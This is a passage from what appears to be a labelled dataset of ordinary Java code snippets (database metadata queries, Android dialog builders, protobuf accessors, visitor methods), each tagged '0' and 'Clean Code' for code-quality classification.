      f.setRemarks(resultSet.getString(""ROUTINE_COMMENT""));
    }
    return f;
  }
);
  String functionDDlSql=String.format(""SHOW CREATE FUNCTION %s"",functionName);
  SQLExecutor.getInstance().execute(connection,functionDDlSql,resultSet -> {
    if (resultSet.next()) {
      function.setFunctionBody(resultSet.getString(""Create Function""));
    }
  }
);
  return function;
}
",0,Clean Code
"private TLRPC.TL_dialogFolder ensureFolderDialogExists(int folderId,boolean[] folderCreated){
  if (folderId == 0) {
    return null;
  }
  long folderDialogId=DialogObject.makeFolderDialogId(folderId);
  TLRPC.Dialog dialog=dialogs_dict.get(folderDialogId);
  if (dialog instanceof TLRPC.TL_dialogFolder) {
    if (folderCreated != null) {
      folderCreated[0]=false;
    }
    return (TLRPC.TL_dialogFolder)dialog;
  }
  if (folderCreated != null) {
    folderCreated[0]=true;
  }
  TLRPC.TL_dialogFolder dialogFolder=new TLRPC.TL_dialogFolder();
  dialogFolder.id=folderDialogId;
  dialogFolder.peer=new TLRPC.TL_peerUser();
  dialogFolder.folder=new TLRPC.TL_folder();
  dialogFolder.folder.id=folderId;
  dialogFolder.folder.title=LocaleController.getString(""ArchivedChats"",R.string.ArchivedChats);
  dialogFolder.pinned=true;
  int maxPinnedNum=0;
  for (int a=0; a < allDialogs.size(); a++) {
    TLRPC.Dialog d=allDialogs.get(a);
    if (!d.pinned) {
      if (d.id != promoDialogId) {
        break;
      }
      continue;
    }
    maxPinnedNum=Math.max(d.pinnedNum,maxPinnedNum);
  }
  dialogFolder.pinnedNum=maxPinnedNum + 1;
  TLRPC.TL_messages_dialogs dialogs=new TLRPC.TL_messages_dialogs();
  dialogs.dialogs.add(dialogFolder);
  getMessagesStorage().putDialogs(dialogs,1);
  dialogs_dict.put(folderDialogId,dialogFolder);
  allDialogs.add(0,dialogFolder);
  return dialogFolder;
}",0,Clean Code
"String getChannelName();
",0,Clean Code
"@Override public int getPollingInterval(){
  System.out.println(""Sending the polling interval to "" + pollingInterval);
  return pollingInterval;
}
",0,Clean Code
"public ChooserDialog build(){
  TypedArray ta=_context.obtainStyledAttributes(R.styleable.FileChooser);
  final AlertDialog.Builder builder=new AlertDialog.Builder(_context,ta.getResourceId(R.styleable.FileChooser_fileChooserDialogStyle,R.style.FileChooserDialogStyle));
  final int style=ta.getResourceId(R.styleable.FileChooser_fileChooserListItemStyle,R.style.FileChooserListItemStyle);
  ta.recycle();
  final Context context=new ContextThemeWrapper(_context,style);
  ta=context.obtainStyledAttributes(R.styleable.FileChooser);
  final int listview_item_selector=ta.getResourceId(R.styleable.FileChooser_fileListItemFocusedDrawable,R.drawable.listview_item_selector);
  ta.recycle();
  _adapter=new DirAdapter(context,this._dateFormat);
  if (_adapterSetter != null)   _adapterSetter.apply(_adapter);
  refreshDirs();
  builder.setAdapter(_adapter,this);
  if (!_disableTitle) {
    if (_titleRes != -1) {
      builder.setTitle(_titleRes);
    }
 else     if (_title != null) {
      builder.setTitle(_title);
    }
 else {
      builder.setTitle(R.string.choose_file);
    }
  }
  if (_iconRes != -1) {
    builder.setIcon(_iconRes);
  }
 else   if (_icon != null) {
    builder.setIcon(_icon);
  }
  if (_layoutRes != -1) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
      builder.setView(_layoutRes);
    }
  }
  if (_dirOnly || _enableMultiple) {
    DialogInterface.OnClickListener listener=(dialog,which) -> {
      if (_result != null) {
        _result.onChoosePath(_currentDir.getAbsolutePath(),_currentDir);
      }
    }
;
    if (_okRes != -1) {
      builder.setPositiveButton(_okRes,listener);
    }
 else     if (_ok != null) {
      builder.setPositiveButton(_ok,listener);
    }
 else {
      builder.setPositiveButton(R.string.title_choose,listener);
    }
  }
  if (_negativeRes != -1) {
    builder.setNegativeButton(_negativeRes,_negativeListener);
  }
 else   if (_negative != null) {
    builder.setNegativeButton(_negative,_negativeListener);
  }
 else {
    builder.setNegativeButton(R.string.dialog_cancel,_negativeListener);
  }
  if (_cancelListener != null) {
    builder.setOnCancelListener(_cancelListener);
  }
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1 && _onDismissListener != null) {
    builder.setOnDismissListener(_onDismissListener);
  }
  builder.setOnKeyListener(new keyListener(this));
  _alertDialog=builder.create();
  _alertDialog.setCanceledOnTouchOutside(this._cancelOnTouchOutside);
  _alertDialog.setOnShowListener(new onShowListener(this));
  _list=_alertDialog.getListView();
  _list.setOnItemClickListener(this);
  if (_enableMultiple) {
    _list.setOnItemLongClickListener(this);
  }
  if (_enableDpad) {
    _list.setSelector(listview_item_selector);
    _list.setDrawSelectorOnTop(true);
    _list.setItemsCanFocus(true);
    _list.setOnItemSelectedListener(this);
    _list.setChoiceMode(ListView.CHOICE_MODE_SINGLE);
  }
  _list.requestFocus();
  return this;
}",0,Clean Code
"/** 
 * <code>optional .LineupInfo lineup = 8;</code>
 * @return whether the lineup field is set
 */
public boolean hasLineup(){
  return (bitField0_ & 0x00000004) != 0;
}",0,Clean Code
"@Override public J.Annotation visitAnnotation(J.Annotation annotation,ExecutionContext ctx){
  J.Annotation a=super.visitAnnotation(annotation,ctx);
  if (!annotationMatcher.matches(a)) {
    return a;
  }
  AtomicBoolean didPassFirstAttribute=new AtomicBoolean(false);
  AtomicBoolean shouldTrimNextPrefix=new AtomicBoolean(false);
  return a.withArguments(ListUtils.map(a.getArguments(),arg -> {
    try {
      if (arg instanceof J.Assignment) {
        J.Assignment assignment=(J.Assignment)arg;
        J.Identifier variable=(J.Identifier)assignment.getVariable();
        if (attributeName.equals(variable.getSimpleName())) {
          if (!didPassFirstAttribute.get()) {
            shouldTrimNextPrefix.set(true);
          }
          return null;
        }
      }
 else       if (attributeName.equals(""value"")) {
        if (!didPassFirstAttribute.get()) {
          shouldTrimNextPrefix.set(true);
        }
        return null;
      }
      if (shouldTrimNextPrefix.get()) {
        shouldTrimNextPrefix.set(false);
        return arg.withPrefix(arg.getPrefix().withWhitespace(""""));
      }
    }
  finally {
      didPassFirstAttribute.set(true);
    }
    return arg;
  }
));
}
",0,Clean Code
"/** 
 * Deserialization factory.
 * @param version The serialized object version.
 * @param className The class name.
 * @param message The serialized data.
 * @throws InvalidProtocolBufferException If the protobuf could not be parsed from the {@code message}.
 * @return The deserialized object.
 */
public static CRFParameters deserializeFromProto(int version,String className,Any message) throws InvalidProtocolBufferException {
  if (version < 0 || version > CURRENT_VERSION) {
    throw new IllegalArgumentException(""Unknown version "" + version + "", this class supports at most version ""+ CURRENT_VERSION);
  }
  CRFParametersProto proto=message.unpack(CRFParametersProto.class);
  int numLabels=proto.getNumLabels();
  int numFeatures=proto.getNumFeatures();
  Tensor biasTensor=ProtoUtil.deserialize(proto.getBiases());
  Tensor featureLabelTensor=ProtoUtil.deserialize(proto.getFeatureLabelWeights());
  Tensor labelLabelTensor=ProtoUtil.deserialize(proto.getLabelLabelWeights());
  if (!(biasTensor instanceof DenseVector)) {
    throw new IllegalArgumentException(""Invalid protobuf, expected bias vector, found "" + biasTensor.getClass().getSimpleName());
  }
 else   if (((DenseVector)biasTensor).size() != numLabels) {
    throw new IllegalArgumentException(""Invalid protobuf, expected bias vector with "" + numLabels + "" elements, but found ""+ ((DenseVector)biasTensor).size());
  }
  if (!(featureLabelTensor instanceof DenseMatrix)) {
    throw new IllegalArgumentException(""Invalid protobuf, expected feature/label matrix, found "" + featureLabelTensor.getClass().getSimpleName());
  }
  DenseMatrix featureLabelMatrix=(DenseMatrix)featureLabelTensor;
  if ((featureLabelMatrix.getDimension1Size() != numLabels) || (featureLabelMatrix.getDimension2Size() != numFeatures)) {
    throw new IllegalArgumentException(""Invalid protobuf, expected feature/label matrix of size ["" + numLabels + "", ""+ numFeatures+ ""], found ""+ Arrays.toString(featureLabelMatrix.getShape()));
  }
  if (!(labelLabelTensor instanceof DenseMatrix)) {
    throw new IllegalArgumentException(""Invalid protobuf, expected label/label matrix, found "" + labelLabelTensor.getClass().getSimpleName());
  }
  DenseMatrix labelLabelMatrix=(DenseMatrix)labelLabelTensor;
  if ((labelLabelMatrix.getDimension1Size() != numLabels) || (labelLabelMatrix.getDimension2Size() != numLabels)) {
    throw new IllegalArgumentException(""Invalid protobuf, expected label/label matrix of size ["" + numLabels + "", ""+ numLabels+ ""], found ""+ Arrays.toString(labelLabelMatrix.getShape()));
  }
  return new CRFParameters((DenseVector)biasTensor,featureLabelMatrix,labelLabelMatrix);
}",0,Clean Code
"/** 
 * <code>optional uint32 gacha_type = 2;</code>
 * @return the gachaType
 */
public int getGachaType(){
  return gachaType;
}",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (getClass() != obj.getClass())   return false;
  DatabaseIdentity other=(DatabaseIdentity)obj;
  if (majorVersion != other.majorVersion)   return false;
  if (minorVersion != other.minorVersion)   return false;
  if (productName == null) {
    if (other.productName != null)     return false;
  }
 else   if (!productName.equals(other.productName))   return false;
  if (productVersion == null) {
    if (other.productVersion != null)     return false;
  }
 else   if (!productVersion.equals(other.productVersion))   return false;
  return true;
}
",0,Clean Code
"@Override public int prevSetBit(int index){
  return bitSet.previousSetBit(index);
}
",0,Clean Code
"/** 
 * Closes the given factories, ignoring any exceptions. 
 */
public static void closeQuietly(Iterable<ModuleKeyFactory> factories){
  for (  ModuleKeyFactory factory : factories) {
    try {
      factory.close();
    }
 catch (    Exception ignored) {
    }
  }
}
",0,Clean Code
"public @Nullable <JT extends JavaType>List<JT> visit(@Nullable List<JT> javaTypes,P p){
  return ListUtils.map(javaTypes,jt -> (JT)visit(jt,p));
}
public JavaType visit(@Nullable JavaType javaType,P p){
  if (javaType != null) {
    cursor=new Cursor(cursor,javaType);
    javaType=preVisit(javaType,p);
    if (javaType instanceof JavaType.Array) {
      javaType=visitArray((JavaType.Array)javaType,p);
    }
 else     if (javaType instanceof JavaType.Class) {
      javaType=visitClass((JavaType.Class)javaType,p);
    }
 else     if (javaType instanceof JavaType.GenericTypeVariable) {
      javaType=visitGenericTypeVariable((JavaType.GenericTypeVariable)javaType,p);
    }
 else     if (javaType instanceof JavaType.Intersection) {
      javaType=visitIntersection((JavaType.Intersection)javaType,p);
    }
 else     if (javaType instanceof JavaType.MultiCatch) {
      javaType=visitMultiCatch((JavaType.MultiCatch)javaType,p);
    }
 else     if (javaType instanceof JavaType.Parameterized) {
      javaType=visitParameterized((JavaType.Parameterized)javaType,p);
    }
 else     if (javaType instanceof JavaType.Primitive) {
      javaType=visitPrimitive((JavaType.Primitive)javaType,p);
    }
 else     if (javaType instanceof JavaType.Method) {
      javaType=visitMethod((JavaType.Method)javaType,p);
    }
 else     if (javaType instanceof JavaType.Variable) {
      javaType=visitVariable((JavaType.Variable)javaType,p);
    }
    if (javaType != null) {
      javaType=postVisit(javaType,p);
    }
    cursor=cursor.getParentOrThrow();
    return javaType;
  }
  return null;
}
",0,Clean Code
"@Override public IAddress getIAddress(final ESide side){
  return new CAddress(getAddress(side));
}
",0,Clean Code
